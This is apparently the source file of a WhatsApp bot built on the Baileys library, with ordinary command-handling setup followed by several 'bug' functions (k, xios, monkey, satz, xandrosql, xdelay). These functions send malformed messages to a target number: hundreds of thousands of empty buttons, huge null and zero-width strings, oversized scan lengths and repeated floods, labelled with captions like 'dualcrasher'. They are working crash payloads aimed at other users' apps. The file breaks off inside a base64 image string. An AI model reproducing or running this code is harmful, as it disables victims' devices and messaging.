+/*

*/
require('../setting/config')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

// ===================== Module =====================
const { 
    spawn: 
    spawn, 
    exec 
} = require('child_process')
const path = require('path')
const fs = require('fs')
const pino = require('pino')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const NodeCache = require("node-cache");
const axios = require('axios')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed()
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { ocrSpace } = require("ocr-space-api-wrapper")
const sharp = require("sharp")
module.exports = rich = async (rich, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);

// ===================== Database ===========================
const owner = JSON.parse(fs.readFileSync('./function/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./function/premium.json'))
const bankDataPath = './bankData.json';

// Load bank data on startup
global.bankList = fs.existsSync(bankDataPath)
  ? JSON.parse(fs.readFileSync(bankDataPath))
  : {};

// Save function
function saveBankList() {
  fs.writeFileSync(bankDataPath, JSON.stringify(global.bankList, null, 2));
}
// ===================== Body dan Prefix =====================
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) 
    ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : "" 
  : global.prefa ?? global.prefix

// ===================== Command Handling ==================
const isCmd = budy.startsWith(prefix)
const command = isCmd ? budy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = budy.trim().split(/ +/).slice(1)
const qtext = q = args.join(" ")
const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
// ===================== User Info ===========================
const botNumber = await rich.decodeJid(rich.user.id)
const isCreator = [botNumber, ...owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isPremium = [botNumber, ...Premium]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

// ===================== Quoted Message =====================
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m

// ===================== Utility Functions =====================
const { 
    smsg,
    tanggal, 
    getTime, 
    isUrl, 
    sleep, 
    clockString, 
    runtime, 
    fetchJson, 
    getBuffer, 
    jsonformat, 
    format, 
    parseMention, 
    getRandom, 
    getGroupAdmins, 
    generateProfilePicture 
} = require('../function/storage')
const sendPollMenu = async (rich, jid) => {
  await rich.sendMessage(jid, {
    text: '📊 *Poll Menu*\n\nChoose one:',
    buttons: [
      { buttonId: 'poll_me', buttonText: { displayText: '🧠 Me' }, type: 1 },
      { buttonId: 'poll_button', buttonText: { displayText: '🔘 Button' }, type: 1 },
      { buttonId: 'poll_from', buttonText: { displayText: '📍 From' }, type: 1 },
    ],
    footer: 'Vote by tapping a button',
    headerType: 1
  });
};
// ======= Group Info =========
const from = mek.key.remoteJid
const sender = m.isGroup 
  ? (m.key.participant ? m.key.participant : m.participant) 
  : m.key.remoteJid

const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : ""

// ===================== User Info Tambahan ==================
const pushname = m.pushName || "No Name"

// ===================== Waktu & Lokalisasi ==================
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
})

// ===================== MIME ==============================
const mime = (quoted.msg || quoted).mimetype || ''

// ===================== Exif & Media Converter ===============
const { 
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    addExif 
} = require('../function/exif.js')

// ===================== Media Assets ========================
const imgCrL = fs.readFileSync("./start/media/CrL.jpg")
const image1 = fs.readFileSync("./start/media/image1.jpg")
const pici = fs.readFileSync("./start/media/image1.jpg")
const richieplay = fs.readFileSync("./start/media/rich.mp3")
// ===================== Access Control =====================
if (!rich.public) {
  if (!isCreator) return
}
   
// ===================== Console Logger =====================
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}

// ===================== Bug Functions =====================

// ===================== Custom Reply =====================

const reply = m.reply

// ===================== Emoji Reaction =====================

const reaction = async (target, emoji) => {
    rich.sendMessage(target, {
        react: {
            text: emoji,
            key: m.key 
        } 
    });
}

// ===================== Mention Helper =====================
rich.ments = async (text) => {
    return [m.chat];
}
global.menuImageCache = {}
global.menuImageReady = false
rich.tempIdStore = {}
rich.lastMenuId = {}
// ===================== Image Resizer (WIP) =================
async function resize(image, width, height) {
  const img = await jimp.read(image)
  img.resize(width, height)
  return await img.getBufferAsync(jimp.MIME_JPEG)
}


async function k(rich, target) {
  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];
  try {
    const msg = {     groupStatusMessageV2: {
        message: {         interactiveMessage: {
            header: {              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
                directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
                mimetype: "video/mp4",
                mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
                fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
                fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
                fileLength: "87906632",
                mediaKeyTimestamp: "1778075081",
                jpegThumbnail: null,
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
              },
            },
            caption: "you want to die?",
          },
          body: {
            text: "mega7core?" + TAGS,
          },
          footer: {
            text: "alphadevil?",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 300000 }, () => ({})),
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              display_text: "\0".repeat(99999),
              id: "\u200B".repeat(99999),
              flow_token: "\n".repeat(99999),
            }),
          },
        },
      },
    };

    await rich.relayMessage(target, msg, {
      participant: { jid: target },
    });
    console.log("Error Woy" + target);
  } catch (err) {
    console.error("Error sending to" + target + ":", err);
  }
}

async function xios(rich, target) {
    for (let i = 0; i < 500; i++) {
        const content = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            {
                                messageType: 2,
                                messageText: "mega7core?"
                            }
                        ],
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                response_id: crypto.randomUUID(),
                                sections: [
                                    {
                                        view_model: {
                                            primitive: {
                                                text: "alpha devil?",
inline_entities: ["{".repeat(500000)],
                                                __typename: "GenAIMarkdownTextUXPrimitive",
                                            },
                                            __typename: "GenAISingleLayoutViewModel",
                                        },
                                    },
                                ],
                            })).toString('base64')
                        },
                        contextInfo: {
                            forwardingScore: 1,
isForwarded: true,
                            forwardOrigin: 4,
                            forwardedAiBotMessageInfo: {
                                botJid: "0@bot"
                            }
                        }
                    }
                }
            }
        };

        
        const msg = await rich.generateWAMessageFromContent
            ? await rich.generateWAMessageFromContent(target, content, {})
            : await generateWAMessageFromContent(target, content, {}); 

        
        await rich.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            noSelfSync: { jid: target }
        });
    }
}


async function monkey(rich, target) {
 const code = "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u500B";
 const repeat = 1000000;
 const msg = {
 groupStatusMessageV2: {
 message: {
 interactiveMessage: {
 body: {
 text: "🥂🍷ꦾØ$ł₦ŁU₣₣¥🥂🍷🎩",
 display_text: "\u200C"
 },
 nativeFlowInfo: {
 name: "single_select",
 paramsJson: JSON.stringify({
 icon: "document",
 title: "Monkey?!",
 sections: Array.from({ length: 505555 }, () => ({}))
 })
 },
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
 }
 }
 }
 }
 };
 await rich.relayMessage(target, msg, {});
 }


async function satz(rich, target) {
await rich.relayMessage(target,{
interactiveMessage: {
header: {
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
hasMediaAttachment: true 
},
body: {},
nativeFlowMessage: {
  buttons: [
    {
      name: "order_status",
      buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"Devsmart" + "ြ".repeat(45000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"Devsmart?" + "ြ".repeat(45000)}\",
        \"quantity\":-9,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
    }
  ],
  messageParamsJson: ""
},
contextInfo: {
  forwardingScore: 999,
  isForwarded: true,
  pairedMediaType: "NOT_PAIRED_MEDIA"
}
}
},{})
 }



async function xandrosql(target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "dualcrasher",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "Dual7core.pdf",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };
  await rich.relayMessage(target, msg, {
    participant: true },{
  })
}

async function xdelay(rich, target) {
    await rich.relayMessage(
        "status@broadcast",
        {
    "videoMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7161-24/633903640_1332756785737289_7028107152517738000_n.enc?ccb=11-4&oh=01_Q5Aa4gHgzQZXe6kKnSDfNhG1zFz5YFlN5XgRYMn2RB5eaKinTw&oe=6A35ED0E&_nc_sid=5e03e0&mms3=true",
        "mimetype": "video/mp4",
        "fileSha256": "Z1BM836S7mPMkznfCHYWer8C8RJj2Vhtfs344BGkBto=",
        "fileLength": "295889",
        "seconds": 15,
        "mediaKey": "m7LTZtdTKMIxxiCF4Zmyg0uQWTNqJR2gbOYLQ+nrgYw=",
        "caption": "there's no one like martins.",
        "height": 576,
        "width": 1280,
        "fileEncSha256": "/tMa5HEYiUmEsdGnJDi3YFQnXglX7lSPCXldju+Qduk=",
        "directPath": "/v/t62.7161-24/633903640_1332756785737289_7028107152517738000_n.enc?ccb=11-4&oh=01_Q5Aa4gHgzQZXe6kKnSDfNhG1zFz5YFlN5XgRYMn2RB5eaKinTw&oe=6A35ED0E&_nc_sid=5e03e0",
        "mediaKeyTimestamp": "1779339758",
        "jpegThumbnail": "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